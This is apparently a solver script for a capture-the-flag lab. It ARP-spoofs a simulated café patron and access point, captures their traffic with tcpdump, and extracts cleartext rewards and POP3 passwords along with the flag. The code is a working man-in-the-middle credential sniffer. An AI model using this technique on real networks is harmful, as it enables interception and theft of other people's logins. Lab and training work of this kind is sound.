#!/usr/bin/env python3
"""Diner open Wi-Fi lane: get between the patron and the AP, read the cleartext.

    wifi_sniff.py            # arp-spoof the patron <-> AP, sniff, pull the flag
    wifi_sniff.py --time 25  # capture window (default 20s)

The diner segment is a switched LAN standing in for open 802.11 (Docker has no
radio). Two containers share it with you: the AP (rewards portal + POP3) and a
patron that logs in and checks mail in the clear every few seconds. A switch
won't flood their unicast to you, so this does an active ARP-spoof MITM
(`arpspoof`), forwards, and tcpdumps the result. Noisy on purpose - the AP
watches for the ARP storm and it feeds the Alert meter.

Needs NET_ADMIN + NET_RAW and net.ipv4.ip_forward=1 (the compose file sets all
three on the player box).
"""
from __future__ import annotations

import argparse
import re
import signal
import subprocess
import sys
import time

sys.path.insert(0, "/opt/pktr/scripts")
from targets import guard  # noqa: E402

AP = "172.31.60.10"
PATRON = "172.31.60.20"
FLAG_RE = re.compile(r"PKTR\{[A-Za-z0-9_]+\}")
CRED_RE = re.compile(r"[?&]pass=([^&\s]+)|^PASS ([^\r\n]+)", re.MULTILINE)


def lan_iface() -> str:
    out = subprocess.run(["ip", "-o", "route"], capture_output=True, text=True).stdout
    for line in out.splitlines():
        if "172.31.60." in line and " dev " in line:
            return line.split(" dev ")[1].split()[0]
    sys.exit("[wifi] no interface on the diner segment (172.31.60.0/24) - "
             "is the player box on lan-net?")


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--time", type=int, default=20)
    args = ap.parse_args()

    guard(AP)
    guard(PATRON)
    iface = lan_iface()
    print(f"[wifi] segment iface {iface}; MITM {PATRON} <-> {AP} for {args.time}s")

    spoof = [
        subprocess.Popen(["arpspoof", "-i", iface, "-t", PATRON, AP],
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL),
        subprocess.Popen(["arpspoof", "-i", iface, "-t", AP, PATRON],
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL),
    ]
    time.sleep(2)

    cap = subprocess.Popen(
        ["tcpdump", "-i", iface, "-l", "-n", "-A", "-s", "0",
         f"host {PATRON} and host {AP}"],
        stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True,
    )

    flag, cred, buf = None, None, []
    deadline = time.time() + args.time
    try:
        while time.time() < deadline and flag is None:
            line = cap.stdout.readline()
            if not line:
                break
            buf.append(line)
            m = FLAG_RE.search(line)
            if m:
                flag = m.group(0)
            c = CRED_RE.search(line)
            if c and not cred:
                cred = c.group(1) or c.group(2)
    finally:
        cap.send_signal(signal.SIGINT)
        for p in spoof:
            p.terminate()
        # let arpspoof send its restore packets
        time.sleep(2)

    if cred:
        print(f"[wifi] sniffed a cleartext rewards credential: pass={cred}")
    if flag:
        print(f"\n[wifi] flag from the patron's inbox:\n  {flag}\n")
        print("submit it:  curl -s -X POST http://scoring:8001/api/score/submit "
              "-H 'Content-Type: application/json' -b /tmp/sc -d '{\"flag\":\"" + flag + "\"}'")
    else:
        print("[wifi] no flag seen. Give it a longer --time, or check the patron "
              "and AP are up (172.31.60.20 / .10).")
        sys.exit(1)


if __name__ == "__main__":
    main()
